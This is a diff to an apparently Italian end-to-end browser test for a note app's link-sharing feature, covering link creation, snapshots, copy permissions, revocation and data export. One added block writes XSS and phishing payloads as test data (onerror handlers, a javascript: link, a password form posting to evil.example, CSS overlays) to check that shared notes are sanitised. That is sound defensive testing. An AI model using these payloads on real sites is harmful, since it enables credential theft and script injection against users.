@@ -1,7 +1,7 @@
 /**
  * Prova l'account in un browser vero: accesso con il codice, appunti portati nell'account,
  * due dispositivi che si sincronizzano, un conflitto senza rete, le impostazioni, l'uscita,
- * i dati scaricati e l'account eliminato.
+ * una nota condivisa con un link, i dati scaricati e l'account eliminato.
  *   npm run build && npm run test:e2e
  * Supabase è finto (scripts/fake-supabase.mjs), ma la sincronizzazione usa le vere migrazioni.
  */
@@ -311,6 +311,150 @@ try {
   )
   pc.errors.push(...google.errors)
 
+  // ——— Condividere una nota con un link ———
+  // Senza account, «Condividi» spiega che serve l'account e propone di accedere.
+  await altro.page.locator('button.share-button').click()
+  const signedOut = altro.page.locator('dialog.dialog-share')
+  await signedOut.waitFor()
+  check((await signedOut.innerText()).includes('serve l\'account'), 'senza account, «Condividi» spiega che serve l\'account')
+  await signedOut.locator('.btn', { hasText: 'Annulla' }).click()
+
+  const owner = portatile.page
+  // Una nota nuova ha il titolo selezionato: si scrive quello vero, poi il resto in fondo.
+  await owner.locator('.notes-head button[aria-label="Nuova nota"]').click()
+  await owner.keyboard.insertText('Nota da condividere')
+  await owner.keyboard.press('Control+End')
+  await owner.keyboard.insertText('Il limite $\\lim_{x \\to 0} \\frac{\\sin x}{x} = 1$.\n')
+  await owner.waitForTimeout(700)
+  await owner.locator('button.share-button').click()
+  const share = owner.locator('dialog.dialog-share')
+  await share.waitFor()
+  const shareReady = () => waitFor(owner, () => {
+    const select = document.querySelector('dialog.dialog-share select')
+    return select && !select.disabled
+  }, undefined, 15000)
+  check((await shareReady()) && (await share.locator('select').inputValue()) === 'none', 'una nota nuova non ha ancora un link («Con limitazioni»)')
+  await share.locator('select').selectOption('link')
+  check(
+    await waitFor(owner, () => document.querySelector('dialog.dialog-share .share-url')?.value.includes('nota.html#'), undefined, 15000),
+    'scegliendo «Chiunque abbia il link» arriva il link',
+  )
+  const link = await share.locator('.share-url').inputValue()
+  check(link.startsWith(url), `il link porta alla pagina accanto a Glifo (${link})`)
+  await share.locator('.btn-primary', { hasText: 'Fine' }).click()
+
+  // Chi riceve il link lo apre senza account, e se ne salva una copia.
+  const reader = await altro.context.newPage()
+  reader.on('pageerror', (e) => pc.errors.push(e.message))
+  await reader.goto(link)
+  check(await waitFor(reader, () => document.querySelector('.shared-body:not([hidden]) .katex')), 'chi apre il link vede la nota, con le formule')
+  check((await reader.locator('.shared-title').innerText()) === 'Nota da condividere', 'e il suo titolo')
+  await reader.locator('button', { hasText: 'Salva una copia' }).click()
+  await reader.waitForSelector('.cm-editor')
+  check((await editorText(reader)).includes('Nota da condividere'), 'con «Salva una copia» la nota va tra i suoi appunti e si apre in Glifo')
+  check(
+    await waitFor(reader, () => [...document.querySelectorAll('.toast')].some((t) => t.textContent.includes('Copia salvata'))),
+    'e un avviso dice dov\'è la copia',
+  )
+  await reader.close()
+
+  // La nota cambia: il link mostra ancora la fotografia, finché non si aggiorna.
+  await typeAtEnd(owner, '\nAggiunta dopo la fotografia.')
+  await owner.locator('button.share-button').click()
+  await shareReady()
+  check(
+    await waitFor(owner, () => document.querySelector('dialog.dialog-share .share-snapshot')?.textContent.includes('dopo è cambiata')),
+    'cambiata la nota, il dialogo dice che il link mostra la fotografia di prima',
+  )
+  const viewer = await altro.context.newPage()
+  viewer.on('pageerror', (e) => pc.errors.push(e.message))
+  const sharedText = async () => {
+    await viewer.goto('about:blank')
+    await viewer.goto(link)
+    await viewer.waitForSelector('.shared-body:not([hidden]), .shared-status.is-problem')
+    return viewer.locator('main').innerText()
+  }
+  check(!(await sharedText()).includes('Aggiunta dopo'), 'chi apre il link vede la fotografia di prima')
+  await share.locator('button', { hasText: 'Aggiorna il link' }).click()
+  check(
+    await waitFor(owner, () => document.querySelector('dialog.dialog-share .share-snapshot')?.textContent.includes('com\'è adesso')),
+    '«Aggiorna il link» rifà la fotografia',
+  )
+  check((await sharedText()).includes('Aggiunta dopo la fotografia'), 'e il link mostra la nota di adesso')
+
+  // Senza «Consenti copie» non c'è «Salva una copia».
+  await share.locator('.share-copy input').uncheck()
+  await shareReady()
+  await sharedText()
+  check(!(await viewer.locator('button', { hasText: 'Salva una copia' }).isVisible()), 'senza «Consenti copie» la copia non si salva')
+
+  // Togliere il link: non si apre più.
+  await share.locator('select').selectOption('none')
+  const confirmUnshare = owner.locator('dialog.dialog-confirm')
+  await confirmUnshare.waitFor()
+  await confirmUnshare.locator('.btn-danger').click()
+  check(
+    await waitFor(owner, () => document.querySelector('dialog.dialog-share select')?.value === 'none' && document.querySelector('dialog.dialog-share .share-link').hidden),
+    'tolto il link, il dialogo torna a «Con limitazioni»',
+  )
+  check((await sharedText()).includes('non funziona più'), 'e il link non si apre più')
+  await share.locator('.btn-primary', { hasText: 'Fine' }).click()
+
+  // Una nota fatta apposta per ingannare chi la apre: niente codice eseguito, niente moduli.
+  await owner.locator('.notes-head button[aria-label="Nuova nota"]').click()
+  await owner.keyboard.insertText('Nota cattiva')
+  await owner.keyboard.press('Control+End')
+  await owner.keyboard.insertText(
+    [
+      '<form action="https://evil.example/ruba"><input name="password" type="password"><button>Accedi di nuovo</button></form>',
+      '<style>.shared-top { display: none !important }</style>',
+      '<img src="x" onerror="window.__rubato = 1"> <a href="javascript:window.__rubato = 2">link</a>',
+      '<div style="position: fixed; inset: 0; background: red">copre tutto</div>',
+      '',
+      '```grafico',
+      'y = x^2 <img src=x onerror="window.__rubato = 3">',
+      '```',
+      '',
+      '```schema',
+      '{"v":1,"nodes":[{"id":"a","shape":"rect","x":0,"y":0,"w":160,"h":60,"text":"<img src=x onerror=\\"window.__rubato = 4\\">"}],"edges":[]}',
+      '```',
+      '',
+    ].join('\n'),
+  )
+  await owner.waitForTimeout(1500)
+  check(
+    await owner.evaluate(() => {
+      const r = document.querySelector('button.share-button').getBoundingClientRect()
+      return !!document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2)?.closest('.share-button')
+    }),
+    'anche nell\'anteprima di Glifo la nota non copre la barra',
+  )
+  await owner.locator('button.share-button').click()
+  await shareReady()
+  await share.locator('select').selectOption('link')
+  await waitFor(owner, () => document.querySelector('dialog.dialog-share .share-url')?.value.includes('nota.html#'), undefined, 15000)
+  const evilLink = await share.locator('.share-url').inputValue()
+  await share.locator('.btn-primary', { hasText: 'Fine' }).click()
+  await viewer.goto(evilLink)
+  await viewer.waitForSelector('.shared-body:not([hidden])')
+  await viewer.waitForTimeout(1500)
+  const evil = await viewer.evaluate(() => {
+    const top = document.querySelector('.shared-top').getBoundingClientRect()
+    const atTop = document.elementFromPoint(top.left + 40, top.top + top.height / 2)
+    return {
+      stolen: window.__rubato ?? null,
+      forms: document.querySelectorAll('.shared-body form, .shared-body button:not(.graph-tool):not(.btn), .shared-body style, .shared-body textarea').length,
+      headerVisible: top.height > 0 && getComputedStyle(document.querySelector('.shared-top')).display !== 'none',
+      headerOnTop: !!atTop?.closest('.shared-top'),
+    }
+  })
+  check(evil.stolen === null, `la nota non esegue codice in chi la apre (${evil.stolen})`)
+  check(evil.forms === 0, 'moduli, pulsanti e stili della nota non arrivano nella pagina')
+  check(evil.headerVisible && evil.headerOnTop, 'e la nota non copre la barra di Glifo')
+  await viewer.locator('a', { hasText: 'link' }).first().click({ modifiers: [] }).catch(() => {})
+  await viewer.waitForTimeout(300)
+  check((await viewer.evaluate(() => window.__rubato ?? null)) === null, 'nemmeno cliccando i suoi link')
+
   // ——— I tuoi dati: scaricarli, poi eliminare l'account ———
   const deletedId = fake.userId(EMAIL)
   await portatile.page.locator('.account-button').click()
@@ -320,11 +464,18 @@ try {
   const file = await downloading
   const exported = JSON.parse(await readFile(await file.path(), 'utf8'))
   check(file.suggestedFilename().startsWith('glifo-dati-account-'), `i dati si scaricano in un file (${file.suggestedFilename()})`)
+  const serverNotes = (await fake.notes(EMAIL)).filter((n) => !n.deleted_at)
   check(
-    exported.account?.email === EMAIL && exported.notes.length === 2 && exported.notes.some((n) => n.content.includes('scritti prima di accedere')),
-    'nel file ci sono l\'account e tutte le sue note',
+    exported.account?.email === EMAIL &&
+      exported.notes.length === serverNotes.length &&
+      exported.notes.some((n) => n.content.includes('scritti prima di accedere')),
+    `nel file ci sono l'account e tutte le sue note (${exported.notes.length} di ${serverNotes.length})`,
   )
   check(exported.settings?.theme === theme, `e le impostazioni dell'account (${exported.settings?.theme})`)
+  check(
+    exported.sharedLinks?.length === 1 && exported.sharedLinks[0].link === evilLink && exported.sharedLinks[0].title === 'Nota cattiva',
+    'e i link condivisi',
+  )
 
   await accountDialog.locator('button', { hasText: 'Elimina account' }).click()
   const confirmDelete = portatile.page.locator('dialog.dialog-delete-account')
@@ -346,6 +497,11 @@ try {
   check(leftAfterDelete.length === 0, `nel browser non resta niente dell'account (${leftAfterDelete})`)
   const counts = await fake.countsFor(deletedId)
   check(counts.users === 0 && counts.notes === 0, `sul server non resta niente dell'account (${JSON.stringify(counts)})`)
+  await viewer.goto('about:blank')
+  await viewer.goto(evilLink)
+  await viewer.waitForSelector('.shared-status.is-problem')
+  check((await viewer.locator('main').innerText()).includes('non funziona più'), 'eliminato l\'account, i suoi link non si aprono più')
+  await viewer.close()
   pc.errors.push(...portatile.errors)
 
   // ——— L'informativa sulla privacy ———
